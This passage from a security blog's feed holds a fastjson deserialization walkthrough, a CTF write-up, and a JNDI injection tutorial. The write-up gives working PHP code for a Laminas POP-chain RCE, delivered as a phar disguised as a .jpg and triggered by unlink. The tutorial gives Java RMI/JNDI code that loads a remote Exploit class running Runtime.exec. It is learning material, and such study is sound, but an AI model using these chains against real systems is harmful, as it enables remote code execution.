alt="image.png"></p><p>后面就开始读取<code>@type</code>的值，也就是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，漫长的调试过程：</p><p><img src="https://s2.loli.net/2022/03/26/21CukypPcdUI7ri.png" alt="image.png"></p><p>终于扫到了最后一个<code>&quot;</code>，大功告成哈哈哈：</p><p><img src="https://s2.loli.net/2022/03/26/21jOVgkLciq3h8F.png" alt="image.png"></p><p>然后就调进<code>loadclass</code>里面了：</p><p><img src="https://s2.loli.net/2022/03/26/bhUZkK8F6X7VCHJ.png" alt="image.png"></p><p>这里我感觉更像是加载这个类然后返回，然后又是经过一大段调试，总算是到了一个反射获取构造方法的地方：</p><p><img src="https://s2.loli.net/2022/03/26/CLE2vZTkMPdSXit.png" alt="image.png"></p><p>在这里获取暴力反射：</p><p><img src="https://s2.loli.net/2022/03/26/3toYOIAyn8rXSMP.png" alt="image.png"></p><p>然后在这里获取到了<code>getOutputProperties()</code>方法，心心念念的<code>getOutputProperties()</code>方法呀</p><p><img src="https://s2.loli.net/2022/03/26/onsycD1ejwXpB5q.png" alt="image.png"></p><p>然后就是通过反射获取到所有的方法了，不断的判断方法的定义规则，最后获取字段，这个调试过程真的太折磨了，获取字段的时候先获取<code>_bytecodes</code></p><p><img src="https://s2.loli.net/2022/03/26/RgIaslmxutNzVrC.png" alt="image.png"></p><p>然后这里做了一手替换，将<code>_</code>替换成了空：</p><p><img src="https://s2.loli.net/2022/03/26/rzNnvgijHZSWf5e.png" alt="image.png"></p><p>然后就是反序列化<code>_bytecodes</code>字段，然后就扫描获取<code>base64</code>的字符串，因为它后面会进行一次解码</p><p><img src="https://s2.loli.net/2022/03/26/N12O9ahcXAn3fWk.png" alt="image.png"></p><p>扫描<code>base64</code>字符串的过程实在是太长了，随便放张过程图吧：</p><p><img src="https://s2.loli.net/2022/03/26/hOgALzcnZjtlYxw.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/26/DzTVesqYow9Mu2c.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/26/VFiH5r7WS6moMXp.png" alt="image.png"></p><p>最终是通过反射执行的<code>TemplatesImpl</code>类中的<code>getOutputProperties</code>方法的</p><p>就是这样了，可能中间调用链的过程也不是非常清晰，因为实在是太长了，还请师傅们谅解</p><p>参考文章：</p><ul><li><a href="http://81.68.112.193/ltltlxey/Java/239.html">http://81.68.112.193/ltltlxey/Java/239.html</a></li><li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#%E5%85%B3%E4%BA%8EFastJson%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#%E5%85%B3%E4%BA%8EFastJson%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90</a></li><li><a href="https://www.cnblogs.com/sijidou/p/13121332.html">https://www.cnblogs.com/sijidou/p/13121332.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;fastjson反序列化&quot;&gt;&lt;a href=&quot;#fastjson反序列化&quot; class=&quot;headerlink&quot; title=&quot;fastjson反序列化&quot;&gt;&lt;/a&gt;fastjson反序列化&lt;/h1&gt;&lt;p&gt;接下来我们来学习&lt;code&gt;Java&lt;/code&gt;中的另一种反序列化，也是非常常见的一种，&lt;code&gt;fastjson&lt;/code&gt;反序列化&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之第二届红明谷杯 --- Fan website</title>
    <link href="https://arsenetang.github.io/2022/03/22/WP%E7%AF%87%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF---Fan%20website/"/>
    <id>https://arsenetang.github.io/2022/03/22/WP%E7%AF%87%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF---Fan%20website/</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-03-22T08:33:05.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届红明谷杯-—-Fan-website"><a href="#第二届红明谷杯-—-Fan-website" class="headerlink" title="第二届红明谷杯 — Fan website"></a>第二届红明谷杯 — Fan website</h1><p>今天打红明谷杯，打出了一道web，考点是<code>phar</code>反序列化</p><span id="more"></span><p><img src="https://s2.loli.net/2022/03/22/9RnJBvV1cuM6P5U.png" alt="image.png"></p><p>首先进去之后<code>www.zip</code>把源码下下来，然后去网上找了找链子</p><p>找到了一篇：<a href="https://xz.aliyun.com/t/8975#toc-12">https://xz.aliyun.com/t/8975#toc-12</a>，直接用它的最后一条链子就行了，具体后面再来审：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Resolver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">map</span> = [&quot;<span class="title">setBody</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">__helpers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Writer</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Mail</span> <span class="title">extends</span> <span class="title">AbstractWriter</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">eventsToMail</span> = [&quot;<span class="title">ls</span>&quot;];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mail = <span class="keyword">new</span> \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Logger</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Logger</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就会发现一个问题，虽然说有了链子，但是没有触发点，就很难搞，去源码里找找有没有可以上传文件的地方：</p><p>就在这个路径下：<code>/module/Album/src/Controller/AlbumController.php</code></p><p><img src="https://s2.loli.net/2022/03/22/wPHmpySELQ1K9d3.png" alt="image.png"></p><p>可以看到，它对文件内容和文件大小都做了限制，不能出现<code>&lt;?php __HALT_COMPILER()</code>，这个好办，咱把它<code>gzip</code>一下就可以了，它还限制文件大小必须大于<code>3kb</code>，所以说我们需要往里面疯狂填入垃圾数据，通过<code>imguploadAction</code>就可以上传上去了</p><p>然后我们往上看，看到了<code>imgdeleteAction</code>，在这里面调用了<code>unlink</code>删除文件，<code>unlink()</code>函数作为文件操作函数，也是可以触发<code>phar</code>反序列化的，有链子，有了触发的地方，这个题差不多就稳了，来看看它的路由：</p><p><img src="https://s2.loli.net/2022/03/22/r5TevSnMsGkLbpU.png" alt="image.png"></p><p>可以看到它的访问方式，也就是说访问<code>imguploadAction()</code>方法也就是访问<code>album/imgupload</code>，同理删除就是<code>album/imgdelete</code></p><p>所以说最终生成<code>phar</code>文件的是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Resolver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">map</span> = [&quot;<span class="title">setBody</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">__helpers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Writer</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Mail</span> <span class="title">extends</span> <span class="title">AbstractWriter</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">eventsToMail</span> = [&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mail = <span class="keyword">new</span> \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Logger</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> \<span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Logger</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hmgb.phar&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;垃圾数据，越多越好，得把它的大小撑起来&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    <span class="comment">//echo base64_encode(serialize($a));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用这个生成<code>hmgb.phar</code>，放到<code>kali</code>下去去压缩一下：<code>gzip hmgb.phar</code>，然后改个后缀，改成<code>hmgb.jpg</code></p><p><img src="https://s2.loli.net/2022/03/22/oDjS7anUIym9NL3.png" alt="image.png"></p><p>在这里传上去，它会返回路径，再去删除的页面触发就好：</p><p><img src="https://s2.loli.net/2022/03/22/zDOAE3UqnyQ7xu8.png" alt="image.png"></p><p>挺水的我感觉，后面准备去认真审审代码，自己构造一下pop链</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;第二届红明谷杯-—-Fan-website&quot;&gt;&lt;a href=&quot;#第二届红明谷杯-—-Fan-website&quot; class=&quot;headerlink&quot; title=&quot;第二届红明谷杯 — Fan website&quot;&gt;&lt;/a&gt;第二届红明谷杯 — Fan website&lt;/h1&gt;&lt;p&gt;今天打红明谷杯，打出了一道web，考点是&lt;code&gt;phar&lt;/code&gt;反序列化&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之JNDI注入</title>
    <link href="https://arsenetang.github.io/2022/03/21/Java%E7%AF%87%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://arsenetang.github.io/2022/03/21/Java%E7%AF%87%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T11:56:26.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>前面做了做铺垫，这篇文章就来正式进入<code>jndi</code>注入的学习，其实也不算特别难，就是链子有点儿长，得耐心下来</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>JNDI(Java Naming and Directory Interface)</code>，是SUN公司提供的一种标准的Java<strong>命名</strong>和<strong>目录接口</strong>，JNDI提供统一的<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>可以和这些命名服务和<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1/10413830">目录服务</a>之间进行交互，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口</p><p><code>JNDI</code>支持的服务主要有：DNS、LDAP、CORBA、RMI等等，其实常用的也就<code>RMI</code>和<code>LDAP</code></p><p>在<code>JNDI</code>中，每个对象都有一组唯一的键值绑定，将每一个对象和名字绑定，使得应用程序可以通过名字搜索到指定的对象，而目录服务是命名服务的自然拓展，这两者的区别就是目录服务中对象不但可以有名称，还可以有属性；命名服务中对象是没有属性的</p><p><img src="https://s2.loli.net/2022/03/21/jVWyTehR6InovSu.png" alt="image.png"></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>那么，为什么会出现漏洞呢？</p><p>首先我们来看看<code>RMI</code>，因为<code>RMI</code>注册表服务提供程序<code>(RMI Registry Service Provider)</code>允许应用程序通过<code>JNDI</code>应用接口对<code>RMI</code>中注册的远程对象进行访问，那么假如我们远程绑定一个恶意对象，是不是就可以了？</p><p><code>RMI</code>的核心特点之一就是动态类加载，假如当前<code>Java</code>虚拟机中并没有此类，它可以去远程<code>URL</code>中去下载这个类的<code>class</code>，而这个<code>class</code>文件可以使用web服务的方式进行托管；而<code>rmi</code>注册表上可以动态的加载绑定多个<code>rmi</code>应用；对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p><p>就是利用<code>RMI</code>去动态加载类，<code>RMI</code>那里绑定了一个对象，然后通过<code>JNDI</code>去获取这个绑定的对象</p><p>但是在<code>JNDI</code>服务中，<code>RMI</code>服务端除了直接绑定远程对象以外，还可以通过<code>References</code>类来绑定一个外部的远程对象，这个远程对象是当前名称目录系统之外的对象，绑定了<code>Reference</code>之后，服务端会先通过<code>Referenceable.getReference()</code>获取绑定对象的引用，并且在目录中保存。当客户端在<code>lookup()</code>查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先<code>Exploit.class</code>还是和上一篇文章中的一样，放到<code>WWW</code>根目录下面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            Runtime runtime = Runtime.getRuntime();</span><br><span class="line">            Process process = runtime.exec(<span class="string">&quot;cmd.exe /c dir&quot;</span>);</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream, <span class="string">&quot;gb2312&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span>(br.readLine()!=<span class="keyword">null</span>)</span><br><span class="line">                System.out.println(br.readLine());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在写服务端的代码之前，我们先来介绍一下今天的主角：<code>Reference</code>类</p><p><code>javax.naming.Reference</code>类表示对存在于命令或目录系统以外的对象的引用；就是说一个<code>Object</code>对象，可以通过绑定<code>Reference</code>存储在<code>RMI</code>、<code>LDAP</code>服务下面，在使用<code>Reference</code>时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发</p><p>看看<code>Reference</code>类的关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reference</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String className;</span><br><span class="line">    <span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> String classFactory = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> String classFactoryLocation = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className  = className;</span><br><span class="line">        addrs = <span class="keyword">new</span> Vector();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(className);</span><br><span class="line">        classFactory = factory;</span><br><span class="line">        classFactoryLocation = factoryLocation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实主要就是三个参数：<code>className、classFactory、classFactoryLocation</code></p><ul><li><code>classname</code>：远程加载时所使用的类的名字，可以随便取</li><li><code>classFactory</code>：<code>class</code>中需要实例化类的名称</li><li><code>classFactoryLocation</code>：加载<code>class</code>的远程地址，可以是<code>file/ftp/http</code>等协议</li></ul><p>服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDISERVER</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        Reference Exploit = <span class="keyword">new</span> Reference(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;http://127.0.0.1:80/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(Exploit);</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就几行代码，逻辑也很简单，应该也挺好理解，就是将<code>http://127.0.0.1:80/Exploit.class</code>这个类绑定到了<code>127.0.0.1:1089/evil</code>这个名字上了，我们就可以通过<code>rmi</code>来加载它了，客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDICLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/21/wTVPNZUzReYSfoO.png" 